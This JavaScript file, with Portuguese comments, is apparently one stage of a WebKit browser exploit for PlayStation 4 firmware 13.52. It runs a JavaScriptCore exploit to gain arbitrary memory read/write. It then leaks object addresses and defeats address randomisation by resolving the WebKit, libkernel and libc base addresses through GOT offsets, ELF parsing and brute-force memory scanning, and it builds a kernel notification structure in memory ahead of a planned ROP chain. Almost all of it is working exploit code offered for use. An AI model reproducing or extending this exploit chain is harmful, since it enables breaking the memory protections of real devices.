// ═════════════════════════════════════════════════════════════════════════════
// ALIASES DE API R/W (compatibilidade entre mem.js variants)
// ═════════════════════════════════════════════════════════════════════════════
function normalizeRW(p) {
  if (!p.read4 && p.read32) p.read4 = p.read32;
  if (!p.read32 && p.read4) p.read32 = p.read4;
  if (!p.read8 && p.read64) p.read8 = p.read64;
  if (!p.read64 && p.read8) p.read64 = p.read8;
  if (!p.write4 && p.write32) p.write4 = p.write32;
  if (!p.write32 && p.write4) p.write32 = p.write4;
  if (!p.write8 && p.write64) p.write8 = p.write64;
  if (!p.write64 && p.write8) p.write64 = p.write8;
  // byte/short wrappers se não existirem
  if (!p.read8_byte) {
    p.read8_byte = function(a) { return this.read4(a) & 0xFF; };
  }
  if (!p.read16) {
    p.read16 = function(a) { return this.read4(a) & 0xFFFF; };
  }
  return p;
}

// ═════════════════════════════════════════════════════════════════════════════
// RESOLUÇÃO ESTÁTICA VIA OFFSETS (13.52.js)
// ═════════════════════════════════════════════════════════════════════════════

function resolveBasesStatic(p, webkitBase) {
  logH('RESOLUÇÃO ESTÁTICA VIA OFFSETS 13.52');

  const results = { libcBase: null, libkernelBase: null, errors: [] };

  // ── libc via GOT memset ──
  if (typeof OFFSET_wk_memset_import !== 'undefined' && OFFSET_wk_memset_import !== 0 &&
      typeof OFFSET_lc_memset !== 'undefined' && OFFSET_lc_memset !== 0) {
    try {
      let slot = webkitBase.add32(OFFSET_wk_memset_import);
      let ptr = p.read8(slot);
      log('[+] GOT memset @ wk+0x' + OFFSET_wk_memset_import.toString(16) + ' → 0x' + ptr.toString(16), 'ok');

      let libcBase = ptr.sub32(OFFSET_lc_memset);
      log('    ptr - lc_memset(0x' + OFFSET_lc_memset.toString(16) + ') = 0x' + libcBase.toString(16));

      // validação: page aligned?
      if ((libcBase.low & 0xFFF) !== 0) {
        results.errors.push('libcBase não page-aligned: 0x' + libcBase.toString(16));
        log('[-] libcBase NÃO é page-aligned!', 'e');
      } else {
        // validação: ELF magic?
        let magic = p.read4(libcBase);
        if (magic !== 0x464C457F) {
          results.errors.push('libcBase ELF magic inválido: 0x' + magic.toString(16));
          log('[-] libcBase ELF magic inválido: 0x' + magic.toString(16), 'e');
        } else {
          log('[✓] libcBase page-aligned + ELF magic OK', 'ok');
          results.libcBase = libcBase;
          setCard('c-lc', '0x' + libcBase.toString(16));
        }
      }
    } catch (e) {
      results.errors.push('Falha ao ler GOT memset: ' + (e.message || e));
      log('[-] Falha ao ler GOT memset: ' + (e.message || e), 'e');
    }
  } else {
    results.errors.push('OFFSET_wk_memset_import ou OFFSET_lc_memset é 0');
    log('[!] OFFSET_wk_memset_import ou OFFSET_lc_memset é 0 — pulando libc', 'w');
  }

  // ── libkernel via GOT __stack_chk_guard ──
  if (typeof OFFSET_wk___stack_chk_guard_import !== 'undefined' && OFFSET_wk___stack_chk_guard_import !== 0 &&
      typeof OFFSET_lk___stack_chk_guard !== 'undefined' && OFFSET_lk___stack_chk_guard !== 0) {
    try {
      let slot = webkitBase.add32(OFFSET_wk___stack_chk_guard_import);
      let ptr = p.read8(slot);
      log('[+] GOT __stack_chk_guard @ wk+0x' + OFFSET_wk___stack_chk_guard_import.toString(16) + ' → 0x' + ptr.toString(16), 'ok');

      let libkernelBase = ptr.sub32(OFFSET_lk___stack_chk_guard);
      log('    ptr - lk_guard(0x' + OFFSET_lk___stack_chk_guard.toString(16) + ') = 0x' + libkernelBase.toString(16));

      if ((libkernelBase.low & 0xFFF) !== 0) {
        results.errors.push('libkernelBase não page-aligned: 0x' + libkernelBase.toString(16));
        log('[-] libkernelBase NÃO é page-aligned!', 'e');
      } else {
        let magic = p.read4(libkernelBase);
        if (magic !== 0x464C457F) {
          results.errors.push('libkernelBase ELF magic inválido: 0x' + magic.toString(16));
          log('[-] libkernelBase ELF magic inválido: 0x' + magic.toString(16), 'e');
        } else {
          log('[✓] libkernelBase page-aligned + ELF magic OK', 'ok');
          results.libkernelBase = libkernelBase;
          setCard('c-lk', '0x' + libkernelBase.toString(16));
        }
      }
    } catch (e) {
      results.errors.push('Falha ao ler GOT guard: ' + (e.message || e));
      log('[-] Falha ao ler GOT guard: ' + (e.message || e), 'e');
    }
  } else {
    results.errors.push('OFFSET_wk___stack_chk_guard_import ou OFFSET_lk___stack_chk_guard é 0');
    log('[!] OFFSET_wk___stack_chk_guard_import ou OFFSET_lk___stack_chk_guard é 0 — pulando libkernel', 'w');
  }

  return results;
}

// ═════════════════════════════════════════════════════════════════════════════
// RESOLUÇÃO DINÂMICA VIA PARSING ELF (fallback)
// ═════════════════════════════════════════════════════════════════════════════

async function resolveBasesDynamic(p, webkitBase) {
  logH('RESOLUÇÃO DINÂMICA VIA PARSING ELF (fallback)');

  const results = { imports: {}, libcBase: null, libkernelBase: null, errors: [] };

  try {
    // ── Passo 1: ELF magic ──
    let magic = p.read4(webkitBase);
    if (magic !== 0x464C457F) {
      results.errors.push('WebKit base não aponta para ELF válido: 0x' + magic.toString(16));
      log('[-] WebKit base não aponta para ELF válido! magic=0x' + magic.toString(16), 'e');
      return results;
    }
    log('[+] ELF magic válido (\x7fELF)');

    // ── Passo 2: Program headers ──
    let phoff = p.read8(webkitBase.add32(0x20));
    let phnum = p.read16(webkitBase.add32(0x38));
    log('[+] Program headers: ' + phnum + ' entries, offset=0x' + phoff.toString(16));

    // ── Passo 3: PT_DYNAMIC ──
    let dynamicVaddr = null, dynamicSize = 0;
    for (let i = 0; i < phnum; i++) {
      let phAddr = webkitBase.add32(phoff.low + i * 0x38);
      let p_type = p.read32(phAddr);
      if (p_type === 2) { // PT_DYNAMIC
        dynamicVaddr = p.read64(phAddr.add32(0x10)); // p_vaddr
        dynamicSize  = p.read64(phAddr.add32(0x28)).low; // p_memsz
        log('[+] PT_DYNAMIC: vaddr=0x' + dynamicVaddr.toString(16) + ' size=0x' + dynamicSize.toString(16));
        break;
      }
    }
    if (!dynamicVaddr) {
      results.errors.push('PT_DYNAMIC não encontrado');
      log('[-] PT_DYNAMIC não encontrado', 'e');
      return results;
    }

    // ── Passo 4: Parse dynamic entries ──
    let strtab = null, symtab = null, jmprel = null, pltrelsz = 0;
    for (let off = 0; off < dynamicSize; off += 16) {
      let entry = dynamicVaddr.add32(off);
      let tag = p.read8(entry).low;
      let val = p.read8(entry.add32(8));
      if (tag === 5)  strtab = val;      // DT_STRTAB
      if (tag === 6)  symtab = val;      // DT_SYMTAB
      if (tag === 23) jmprel = val;      // DT_JMPREL
      if (tag === 2)  pltrelsz = val.low; // DT_PLTRELSZ
      if (tag === 0)  break;             // DT_NULL
    }
    log('[+] strtab=0x' + (strtab ? strtab.toString(16) : 'null'));
    log('[+] symtab=0x' + (symtab ? symtab.toString(16) : 'null'));
    log('[+] jmprel=0x' + (jmprel ? jmprel.toString(16) : 'null') + ' pltrelsz=' + pltrelsz);

    if (!strtab || !symtab || !jmprel) {
      results.errors.push('Tabelas dinâmicas incompletas');
      log('[-] Tabelas dinâmicas incompletas', 'e');
      return results;
    }

    // ── Passo 5: Varredura RELA (JMPREL = .rela.plt) ──
    let numRela = Math.floor(pltrelsz / 24);
    log('[+] Varrendo ' + numRela + ' entradas RELA...');

    let usefulNames = ['memset','memcpy','strcmp','strlen','pthread_create',
      '__stack_chk_guard','sceKernelDlsym','sceKernelSendNotificationRequest',
      'sceKernelGetpid','sceKernelUsleep','scePthreadCreate','sceKernelGetCurrentCpu'];

    for (let i = 0; i < numRela; i++) {
      let rela = jmprel.add32(i * 24);
      let r_offset = p.read8(rela);
      let r_info   = p.read8(rela.add32(8)).low;
      let symIdx   = r_info >>> 32;

      let st_name = p.read32(symtab.add32(symIdx * 24));
      // ler nome da string table
      let nameBytes = [];
      for (let j = 0; j < 256; j++) {
        let ch = p.read8_byte(strtab.add32(st_name + j));
        if (ch === 0) break;
        nameBytes.push(String.fromCharCode(ch));
      }
      let name = nameBytes.join('');

      if (name.length > 0) {
        let wkOffset = r_offset.sub(webkitBase);
        let importPtr = p.read8(r_offset);
        results.imports[name] = { wkOffset, importPtr };
      }
    }
    log('[+] ' + Object.keys(results.imports).length + ' imports parseados');

    // Logar úteis
    for (let name of usefulNames) {
      if (results.imports[name]) {
        log('    ' + name + ': wk+0x' + results.imports[name].wkOffset.toString(16) +
            ' → 0x' + results.imports[name].importPtr.toString(16), 'd');
      }
    }

    // ── Passo 6: Encontrar bases varrendo para trás ──
    function findElfBase(startPtr, maxBack) {
      for (let back = 0; back < maxBack; back += 0x1000) {
        try {
          let test = startPtr.sub32(back);
          if (p.read4(test) === 0x464C457F) return test;
        } catch(e) {}
      }
      return null;
    }

    // libkernel
    let lkRef = results.imports['__stack_chk_guard'] || results.imports['sceKernelGetpid'] ||
                results.imports['sceKernelUsleep'] || results.imports['scePthreadCreate'];
    if (lkRef) {
      results.libkernelBase = findElfBase(lkRef.importPtr, 0x200000);
      if (results.libkernelBase) {
        log('[+] libkernel base (dinâmica): 0x' + results.libkernelBase.toString(16), 'ok');
        setCard('c-lk', '0x' + results.libkernelBase.toString(16));
      } else {
        results.errors.push('Não encontrou base libkernel via scan');
        log('[-] Não encontrou base libkernel via scan', 'w');
      }
    }

    // libc
    let lcRef = results.imports['memset'] || results.imports['memcpy'] || results.imports['strcmp'];
    if (lcRef) {
      results.libcBase = findElfBase(lcRef.importPtr, 0x200000);
      if (results.libcBase) {
        log('[+] libc base (dinâmica): 0x' + results.libcBase.toString(16), 'ok');
        setCard('c-lc', '0x' + results.libcBase.toString(16));
      } else {
        results.errors.push('Não encontrou base libc via scan');
        log('[-] Não encontrou base libc via scan', 'w');
      }
    }

  } catch (e) {
    results.errors.push('Exceção no parsing ELF: ' + (e.message || e));
    log('[-] Exceção no parsing ELF: ' + (e.message || e), 'e');
  }

  return results;
}

// ═════════════════════════════════════════════════════════════════════════════
// VALIDAÇÃO DE BASES
// ═════════════════════════════════════════════════════════════════════════════

function validateBases(p, libkernelBase, libcBase) {
  logH('VALIDANDO BASES');
  let valid = { libkernel: false, libc: false };

  if (libkernelBase) {
    let magic = p.read4(libkernelBase);
    if (magic === 0x464C457F) {
      log('[✓] libkernel: ELF magic válido', 'ok');
      valid.libkernel = true;
    } else {
      log('[✗] libkernel: ELF magic inválido (0x' + magic.toString(16) + ')', 'e');
    }
    let aligned = (libkernelBase.low & 0xFFF) === 0;
    log(aligned ? '[✓] libkernel: page-aligned' : '[✗] libkernel: NÃO page-aligned',
        aligned ? 'ok' : 'w');
    if (!aligned) valid.libkernel = false;
  }

  if (libcBase) {
    let magic = p.read4(libcBase);
    if (magic === 0x464C457F) {
      log('[✓] libc: ELF magic válido', 'ok');
      valid.libc = true;
    } else {
      log('[✗] libc: ELF magic inválido (0x' + magic.toString(16) + ')', 'e');
    }
    let aligned = (libcBase.low & 0xFFF) === 0;
    log(aligned ? '[✓] libc: page-aligned' : '[✗] libc: NÃO page-aligned',
        aligned ? 'ok' : 'w');
    if (!aligned) valid.libc = false;
  }

  return valid;
}

// ═════════════════════════════════════════════════════════════════════════════
// PREPARAR NOTIFICAÇÃO
// ═════════════════════════════════════════════════════════════════════════════

function prepareNotification(p, notifyFuncAddr, text) {
  logH('PREPARANDO NOTIFICAÇÃO');
  let encoder = new TextEncoder();
  let msgBytes = encoder.encode(text + '\x00');

  // Buffer de 0xC00 (tamanho da struct SceKernelNotificationRequest)
  let buf = new Uint8Array(0xC00);
  buf.fill(0);
  buf.set(msgBytes, 0x20);

  let arrCell = p.leakval(buf);
  let backingStore = p.read8(arrCell.add32(0x10));

  // Montar estrutura mínima
  p.write4(backingStore.add32(0x00), 0);      // type
  p.write4(backingStore.add32(0x04), 0);      // priority
  p.write4(backingStore.add32(0x08), 0);      // msgId
  p.write4(backingStore.add32(0x0C), 0);      // targetId
  p.write4(backingStore.add32(0x10), 0);      // userId
  p.write4(backingStore.add32(0x14), 0);      // unk1
  p.write4(backingStore.add32(0x18), 0);      // unk2
  p.write4(backingStore.add32(0x1C), 0);      // appId
  p.write8(backingStore.add32(0x20), backingStore.add32(0x40)); // msg ptr
  p.write4(backingStore.add32(0x28), msgBytes.length);           // msg len

  log('[+] Buffer de notificação preparado em 0x' + backingStore.toString(16), 'ok');
  log('    notifyFunc = 0x' + notifyFuncAddr.toString(16));

  return { notifyFunc: notifyFuncAddr, requestBuffer: backingStore };
}

// ═════════════════════════════════════════════════════════════════════════════

async function main() {
  const ua = navigator.userAgent;
  const fw = /PlayStation 4\/(\d+\.\d+)/.exec(ua);
  $fw.textContent = fw ? `PlayStation 4 — firmware ${fw[1]}` : `UA: ${ua.slice(0, 40)}`;
  log('UA: ' + ua, 'd');

  setStatus('Rodando exploit JSC (core.js)...', 'r');
  logH('EXPLOIT JSC (WebKit)');

  let carrier;
  try {
    carrier = await establishPrimitive({
      onEvent: (tag, detail, attempt) => {
        document.getElementById('ba').textContent = 'tentativa: ' + (attempt || 1);
        document.getElementById('bg').textContent = 'estágio: ' + tag.toLowerCase();
        log(`[${tag}] ${detail}`, 'i');
      },
      maxAttempts: 0
    });
  } catch (err) {
    setStatus('core.js falhou: ' + err.message, 'e');
    log('[ERRO] ' + err.message, 'e');
    return;
  }

  log('[+] core.js: exploit JSC concluído!', 'ok');
  setStatus('Instalando R/W arbitrário...', 'r');
  logH('INSTALANDO PRIMITIVA R/W (mem.js)');

  let p;
  try {
    p = installWindowP(carrier, {
      promote: true,
      onEvent: (tag, detail) => {
        log(`  [mem/${tag}] ${detail}`, 'd');
      }
    });
  } catch (err) {
    setStatus('mem.js falhou: ' + err.message, 'e');
    log('[ERRO] ' + err.message, 'e');
    return;
  }

  // Normalizar API
  p = normalizeRW(p);
  log('[+] R/W arbitrário: window.p instalado com sucesso!', 'ok');

  // ─── Resolver WebKit Base ───
  setStatus('Resolvendo WebKit Base...', 'r');
  logH('RESOLUÇÃO WEBKIT BASE');

  const ctor = globalThis.__ps5NativeCtor;
  if (typeof ctor !== 'number' || ctor <= 0x100000000) {
    setStatus('Erro: __ps5NativeCtor inválido', 'e');
    log('[-] Falha: __ps5NativeCtor não capturado.', 'e');
    return;
  }

  const hi = Math.floor(ctor / 0x100000000);
  const lo = ctor - hi * 0x100000000;
  const ctorInt64 = new int64(lo >>> 0, hi >>> 0);
  log('[+] __ps5NativeCtor: 0x' + ctorInt64.toString(16), 'a');

  const hc = (typeof OFFSET_wk_host_constructor_candidates !== 'undefined')
             ? OFFSET_wk_host_constructor_candidates[0]
             : 0x36F9E20;
  const resolvedBaseVal = ctor - hc;
  const baseHi = Math.floor(resolvedBaseVal / 0x100000000);
  const baseLo = resolvedBaseVal - baseHi * 0x100000000;
  const webkitBase = new int64(baseLo >>> 0, baseHi >>> 0);

  log('[+] WebKit Base: 0x' + webkitBase.toString(16), 'ok');
  setCard('c-wk', '0x' + webkitBase.toString(16));

  // ─── Tentar resolução estática primeiro ───
  setStatus('Resolvendo bases via offsets estáticos...', 'r');
  let staticRes = resolveBasesStatic(p, webkitBase);
  let libkernelBase = staticRes.libkernelBase;
  let libcBase = staticRes.libcBase;
  let imports = {};

  // ─── Se estática falhou, tentar dinâmica ───
  if (!libkernelBase || !libcBase || staticRes.errors.length > 0) {
    setStatus('Fallback: parsing ELF dinâmico...', 'r');
    let dynRes = await resolveBasesDynamic(p, webkitBase);
    if (!libkernelBase && dynRes.libkernelBase) libkernelBase = dynRes.libkernelBase;
    if (!libcBase && dynRes.libcBase) libcBase = dynRes.libcBase;
    imports = dynRes.imports;
  }

  // ─── Validar ───
  let valid = validateBases(p, libkernelBase, libcBase);

  // ─── Tentar encontrar sceKernelSendNotificationRequest ───
  let notifyFunc = null;
  logH('RESOLVENDO sceKernelSendNotificationRequest');

  // Método 1: via imports dinâmicos
  if (imports['sceKernelSendNotificationRequest']) {
    notifyFunc = imports['sceKernelSendNotificationRequest'].importPtr;
    log('[+] Encontrado via parsing ELF: 0x' + notifyFunc.toString(16), 'ok');
  }
  // Método 2: via offset estático em libkernel (se tivermos)
  else if (libkernelBase && typeof OFFSET_lk_sceKernelSendNotificationRequest !== 'undefined'
           && OFFSET_lk_sceKernelSendNotificationRequest !== 0) {
    notifyFunc = libkernelBase.add32(OFFSET_lk_sceKernelSendNotificationRequest);
    log('[+] Encontrado via offset estático: 0x' + notifyFunc.toString(16), 'ok');
  }
  // Método 3: brute-force no GOT do WebKit procurando ponteiro para libkernel + offset plausível
  else if (libkernelBase) {
    log('[*] Tentando brute-force no GOT do WebKit...', 'w');
    // Procurar no range 0x03C00000-0x03D00000 (região típica do GOT no WebKit PS4)
    let found = false;
    for (let off = 0x03C00000; off < 0x03D00000; off += 8) {
      try {
        let ptr = p.read8(webkitBase.add32(off));
        // Verificar se aponta para dentro de libkernel (±2MB do início)
        if (ptr.hi === libkernelBase.hi) {
          let delta = ptr.low - libkernelBase.low;
          if (delta > 0 && delta < 0x30000) {
            // Verificar se é uma função (primeiro byte != 0x00, 0xCC)
            let b0 = p.read8_byte(ptr);
            if (b0 !== 0x00 && b0 !== 0xCC && b0 !== 0xFF) {
              log('    Candidato @ wk+0x' + off.toString(16) + ' → lk+0x' + delta.toString(16) +
                  ' (byte=0x' + b0.toString(16) + ')', 'd');
              // Se encontrarmos muitos, podemos filtrar melhor
            }
          }
        }
      } catch(e) {}
    }
    if (!found) {
      log('[-] Não encontrado via brute-force', 'w');
    }
  }

  if (notifyFunc) {
    setCard('c-g', '0x' + notifyFunc.toString(16));
  } else {
    setCard('c-g', 'Não encontrado', false);
  }

  // ─── Output final ───
  let outText =
    'WebKit Base    = 0x' + webkitBase.toString(16) + '\n' +
    'libkernel Base = ' + (libkernelBase ? '0x' + libkernelBase.toString(16) : '(falhou)') + '\n' +
    'libSceLibc Base= ' + (libcBase ? '0x' + libcBase.toString(16) : '(falhou)') + '\n' +
    'sceKernelSendNotificationRequest = ' + (notifyFunc ? '0x' + notifyFunc.toString(16) : '(não encontrado)') + '\n' +
    '\n' +
    'Validação:\n' +
    '  libkernel ELF: ' + (valid.libkernel ? '✓ OK' : '✗ FALHOU') + '\n' +
    '  libc ELF:      ' + (valid.libc ? '✓ OK' : '✗ FALHOU') + '\n' +
    '\n' +
    (staticRes.errors.length > 0 ? 'Erros estáticos:\n  ' + staticRes.errors.join('\n  ') + '\n' : '');

  setCbox(outText, (!libkernelBase || !libcBase));

  if (libkernelBase && libcBase && valid.libkernel && valid.libc) {
    setStatus('Todas as bases resolvidas com sucesso!', 'ok');
    log('[+] ===== TODAS AS BASES RESOLVIDAS =====', 'ok');

    // Preparar notificação (não chama ainda — requer ROP/gadgets)
    if (notifyFunc) {
      let notif = prepareNotification(p, notifyFunc, 'PS4 13.52 — WebKit exploit OK!');
      log('[+] Notificação preparada. Endereço da função: 0x' + notif.notifyFunc.toString(16), 'ok');
      log('[!] Chamada da notificação requer ROP chain (gadgets não mapeados)', 'w');
    }
  } else {
    setStatus('Falha na resolução de bases — veja log', 'e');
    log('[-] ===== FALHA NA RESOLUÇÃO =====', 'e');
  }
}
